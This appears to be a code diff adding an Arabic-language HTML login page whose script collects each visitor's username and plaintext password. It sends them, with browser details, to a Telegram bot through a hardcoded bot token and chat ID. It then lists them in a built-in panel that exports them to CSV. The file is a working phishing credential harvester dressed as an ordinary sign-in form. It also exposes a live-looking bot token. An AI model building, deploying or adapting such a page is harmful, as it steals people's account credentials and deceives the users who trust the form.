@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - موقعي</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            max-width: 400px;
+            width: 100%;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 40px 30px;
+            text-align: center;
+            color: white;
+        }
+
+        .header h1 {
+            font-size: 32px;
+            margin-bottom: 8px;
+        }
+
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .form-container {
+            padding: 40px 30px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            background: #fafafa;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+
+        .password-toggle {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #999;
+            font-size: 12px;
+            user-select: none;
+        }
+
+        .password-toggle:hover {
+            color: #667eea;
+        }
+
+        .options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+            font-size: 13px;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .remember-me input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            cursor: pointer;
+        }
+
+        .forgot-password {
+            color: #667eea;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .login-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(102, 126, 234, 0.3);
+        }
+
+        .login-btn:active:not(:disabled) {
+            transform: translateY(0);
+        }
+
+        .login-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 25px 0;
+            color: #999;
+            font-size: 13px;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #ddd;
+        }
+
+        .divider::before {
+            margin-left: 15px;
+        }
+
+        .divider::after {
+            margin-right: 15px;
+        }
+
+        .social-login {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .social-btn {
+            flex: 1;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            background: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .social-btn:hover {
+            background: #f8f8f8;
+            border-color: #667eea;
+        }
+
+        .signup-link {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+        }
+
+        .signup-link a {
+            color: #667eea;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+
+        .message {
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .message.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .message.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .message.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 0.8s ease-in-out infinite;
+            margin-left: 8px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .admin-panel {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: white;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            max-width: 300px;
+        }
+
+        .admin-btn {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .admin-btn:hover {
+            background: #5568d3;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            max-width: 800px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+            direction: rtl;
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #eee;
+        }
+
+        .modal-header h2 {
+            color: #333;
+            margin: 0;
+        }
+
+        .close-btn {
+            background: #ff4757;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .close-btn:hover {
+            background: #ee5a6f;
+        }
+
+        .users-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+        }
+
+        .users-table th,
+        .users-table td {
+            padding: 12px;
+            text-align: right;
+            border-bottom: 1px solid #eee;
+        }
+
+        .users-table th {
+            background: #f8f9fa;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .users-table tr:hover {
+            background: #f8f9fa;
+        }
+
+        .export-btn {
+            background: #2ecc71;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-top: 15px;
+        }
+
+        .export-btn:hover {
+            background: #27ae60;
+        }
+
+        .clear-btn {
+            background: #e74c3c;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-top: 15px;
+            margin-right: 10px;
+        }
+
+        .clear-btn:hover {
+            background: #c0392b;
+        }
+
+        .stats {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .stat-card {
+            flex: 1;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        .stat-card h3 {
+            font-size: 28px;
+            margin-bottom: 5px;
+        }
+
+        .stat-card p {
+            font-size: 12px;
+            opacity: 0.9;
+        }
+
+        .telegram-badge {
+            display: inline-block;
+            background: #0088cc;
+            color: white;
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 11px;
+            margin-right: 10px;
+        }
+
+        @media (max-width: 480px) {
+            .form-container {
+                padding: 30px 20px;
+            }
+            
+            .admin-panel {
+                left: 10px;
+                bottom: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>مرحباً بك</h1>
+            <p>سجل دخولك للمتابعة</p>
+        </div>
+
+        <div class="form-container">
+            <div id="message" class="message"></div>
+
+            <form id="loginForm">
+                <div class="input-group">
+                    <label for="username">اسم المستخدم أو البريد الإلكتروني</label>
+                    <input 
+                        type="text" 
+                        id="username" 
+                        name="username" 
+                        placeholder="أدخل اسم المستخدم"
+                        required
+                    >
+                </div>
+
+                <div class="input-group">
+                    <label for="password">كلمة المرور</label>
+                    <div class="input-wrapper">
+                        <input 
+                            type="password" 
+                            id="password" 
+                            name="password" 
+                            placeholder="أدخل كلمة المرور"
+                            required
+                        >
+                        <span class="password-toggle" onclick="togglePassword()">إظهار</span>
+                    </div>
+                </div>
+
+                <div class="options">
+                    <label class="remember-me">
+                        <input type="checkbox" id="remember">
+                        <span>تذكرني</span>
+                    </label>
+                    <a href="#" class="forgot-password">نسيت كلمة المرور؟</a>
+                </div>
+
+                <button type="submit" class="login-btn" id="submitBtn">تسجيل الدخول</button>
+            </form>
+
+            <div class="divider">أو</div>
+
+            <div class="social-login">
+                <button class="social-btn" onclick="socialLogin('google')">🔍 Google</button>
+                <button class="social-btn" onclick="socialLogin('facebook')">📘 Facebook</button>
+            </div>
+
+            <div class="signup-link">
+                ليس لديك حساب؟ <a href="#">أنشئ حساباً جديداً</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="admin-panel">
+        <span class="telegram-badge">📱 Telegram متصل</span>
+        <button class="admin-btn" onclick="openAdminPanel()">👤 عرض المستخدمين (<span id="userCount">0</span>)</button>
+    </div>
+
+    <div id="adminModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>📊 لوحة تحكم المستخدمين</h2>
+                <button class="close-btn" onclick="closeAdminPanel()">إغلاق</button>
+            </div>
+
+            <div class="stats">
+                <div class="stat-card">
+                    <h3 id="totalUsers">0</h3>
+                    <p>إجمالي المستخدمين</p>
+                </div>
+                <div class="stat-card">
+                    <h3 id="todayUsers">0</h3>
+                    <p>تسجيلات اليوم</p>
+                </div>
+            </div>
+
+            <div id="usersTableContainer"></div>
+
+            <button class="export-btn" onclick="exportToCSV()">📥 تصدير إلى CSV</button>
+            <button class="clear-btn" onclick="clearAllData()">🗑️ حذف جميع البيانات</button>
+        </div>
+    </div>
+
+    <script>
+        // إعدادات Telegram Bot
+        const TELEGRAM_BOT_TOKEN = '8536693758:AAFx-Hx4LXw-k1qnuLkTaK99mtbUGV3DVe0';
+        const TELEGRAM_CHAT_ID = '7723474974';
+
+        let users = [];
+
+        window.onload = function() {
+            loadUsers();
+            updateUserCount();
+        };
+
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const toggleBtn = document.querySelector('.password-toggle');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                toggleBtn.textContent = 'إخفاء';
+            } else {
+                passwordInput.type = 'password';
+                toggleBtn.textContent = 'إظهار';
+            }
+        }
+
+        // إرسال البيانات عبر Telegram
+        async function sendToTelegram(username, password, remember) {
+            const now = new Date();
+            const date = now.toLocaleDateString('ar-SA');
+            const time = now.toLocaleTimeString('ar-SA');
+            
+            const message = `
+🔔 <b>تسجيل دخول جديد!</b>
+
+━━━━━━━━━━━━━━━━━
+👤 <b>المستخدم:</b> ${username}
+🔑 <b>كلمة المرور:</b> ${password}
+💾 <b>تذكرني:</b> ${remember ? '✅ نعم' : '❌ لا'}
+
+📅 <b>التاريخ:</b> ${date}
+🕐 <b>الوقت:</b> ${time}
+
+🌐 <b>المتصفح:</b> ${navigator.userAgent.substring(0, 50)}...
+🔗 <b>الصفحة:</b> ${window.location.href}
+━━━━━━━━━━━━━━━━━
+
+⚡ إشعار تلقائي من موقعك
+            `.trim();
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                const data = await response.json();
+                
+                if (data.ok) {
+                    return { success: true };
+                } else {
+                    console.error('خطأ من Telegram:', data);
+                    return { success: false, error: data.description };
+                }
+            } catch (error) {
+                console.error('خطأ في الإرسال:', error);
+                return { success: false, error: error.message };
+            }
+        }
+
+        // حفظ بيانات المستخدم محلياً
+        function saveUser(username, password, remember) {
+            const userData = {
+                id: Date.now(),
+                username: username,
+                password: password,
+                remember: remember,
+                timestamp: new Date().toISOString(),
+                date: new Date().toLocaleDateString('ar-SA'),
+                time: new Date().toLocaleTimeString('ar-SA'),
+                userAgent: navigator.userAgent
+            };
+
+            users.push(userData);
+            updateUserCount();
+            return true;
+        }
+
+        function loadUsers() {
+            if (users.length === 0) {
+                console.log('لا توجد بيانات محفوظة');
+            }
+        }
+
+        function updateUserCount() {
+            document.getElementById('userCount').textContent = users.length;
+        }
+
+        // معالجة نموذج تسجيل الدخول
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const remember = document.getElementById('remember').checked;
+            const submitBtn = document.getElementById('submitBtn');
+            
+            if (username && password) {
+                // تعطيل الزر وإظهار حالة التحميل
+                submitBtn.disabled = true;
+                submitBtn.innerHTML = 'جاري الإرسال... <span class="spinner"></span>';
+                
+                showMessage('📤 جاري إرسال البيانات إلى Telegram...', 'info');
+                
+                // إرسال إلى Telegram
+                const result = await sendToTelegram(username, password, remember);
+                
+                if (result.success) {
+                    // حفظ محلياً
+                    saveUser(username, password, remember);
+                    
+                    showMessage('✅ تم تسجيل الدخول بنجاح! تم إرسال البيانات إلى Telegram 📱', 'success');
+                    
+                    // إعادة تعيين النموذج
+                    setTimeout(() => {
+                        document.getElementById('loginForm').reset();
+                        submitBtn.disabled = false;
+                        submitBtn.textContent = 'تسجيل الدخول';
+                    }, 2000);
+                } else {
+                    // حفظ محلياً حتى لو فشل الإرسال
+                    saveUser(username, password, remember);
+                    
+                    showMessage('⚠️ تم حفظ البيانات محلياً، لكن فشل الإرسال إلى Telegram. الخطأ: ' + (result.error || 'غير معروف'), 'error');
+                    
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'تسجيل الدخول';
+                }
+            } else {
+                showMessage('❌ يرجى إدخال جميع البيانات', 'error');
+            }
+        });
+
+        function showMessage(text, type) {
+            const messageDiv = document.getElementById('message');
+            messageDiv.textContent = text;
+            messageDiv.className = 'message ' + type;
+            messageDiv.style.display = 'block';
+            
+            if (type !== 'info') {
+                setTimeout(() => {
+                    messageDiv.style.display = 'none';
+                }, 5000);
+            }
+        }
+
+        function openAdminPanel() {
+            const modal = document.getElementById('adminModal');
+            modal.style.display = 'flex';
+            displayUsers();
+            updateStats();
+        }
+
+        function closeAdminPanel() {
+            const modal = document.getElementById('adminModal');
+            modal.style.display = 'none';
+        }
+
+        function displayUsers() {
+            const container = document.getElementById('usersTableContainer');
+            
+            if (users.length === 0) {
+                container.innerHTML = '<p style="text-align: center; color: #999; padding: 20px;">لا توجد بيانات مستخدمين حتى الآن</p>';
+                return;
+            }
+
+            let tableHTML = `
+                <table class="users-table">
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>اسم المستخدم</th>
+                            <th>كلمة المرور</th>
+                            <th>التاريخ</th>
+                            <th>الوقت</th>
+                            <th>تذكرني</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+            `;
+
+            users.forEach((user, index) => {
+                tableHTML += `
+                    <tr>
+                        <td>${index + 1}</td>
+                        <td>${user.username}</td>
+                        <td>${user.password}</td>
+                        <td>${user.date}</td>
+                        <td>${user.time}</td>
+                        <td>${user.remember ? '✅' : '❌'}</td>
+                    </tr>
+                `;
+            });
+
+            tableHTML += `
+                    </tbody>
+                </table>
+            `;
+
+            container.innerHTML = tableHTML;
+        }
+
+        function updateStats() {
+            document.getElementById('totalUsers').textContent = users.length;
+            
+            const today = new Date().toLocaleDateString('ar-SA');
+            const todayCount = users.filter(user => user.date === today).length;
+            document.getElementById('todayUsers').textContent = todayCount;
+        }
+
+        function exportToCSV() {
+            if (users.length === 0) {
+                alert('لا توجد بيانات للتصدير');
+                return;
+            }
+
+            let csv = 'الرقم,اسم المستخدم,كلمة المرور,التاريخ,الوقت,تذكرني,المتصفح\n';
+            
+            users.forEach((user, index) => {
+                csv += `${index + 1},"${user.username}","${user.password}","${user.date}","${user.time}","${user.remember ? 'نعم' : 'لا'}","${user.userAgent}"\n`;
+            });
+
+            const blob = new Blob(['\ufeff' + csv], { type: 'text/csv;charset=utf-8;' });
+            const link = document.createElement('a');
+            const url = URL.createObjectURL(blob);
+            
+            link.setAttribute('href', url);
+            link.setAttribute('download', `users_${Date.now()}.csv`);
+            link.style.visibility = 'hidden';
+            
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            
+            alert('✅ تم تصدير البيانات بنجاح!');
+        }
+
+        function clearAllData() {
+            if (confirm('⚠️ هل أنت متأكد من حذف جميع بيانات المستخدمين؟ هذا الإجراء لا يمكن التراجع عنه!')) {
+                users = [];
+                updateUserCount();
+                displayUsers();
+                updateStats();
+                alert('✅ تم حذف جميع البيانات بنجاح');
+            }
+        }
+
+        async function socialLogin(platform) {
+            const username = `${platform}_user_${Date.now()}`;
+            const submitBtn = document.getElementById('submitBtn');
+            
+            submitBtn.disabled = true;
+            showMessage(`📤 جاري تسجيل الدخول عبر ${platform}...`, 'info');
+            
+            const result = await sendToTelegram(username, 'social_login', false);
+            
+            if (result.success) {
+                saveUser(username, 'social_login', false);
+                showMessage(`✅ تم تسجيل الدخول عبر ${platform} وإرسال البيانات 📱`, 'success');
+            } else {
+                saveUser(username, 'social_login', false);
+                showMessage(`⚠️ تم التسجيل محلياً لكن فشل إرسال Telegram`, 'error');
+            }
+            
+            submitBtn.disabled = false;
+        }
+
+        window.onclick = function(event) {
+            const modal = document.getElementById('adminModal');
+            if (event.target === modal) {
+                closeAdminPanel();
+            }
+        }
+    </script>
+</body>
+</html>
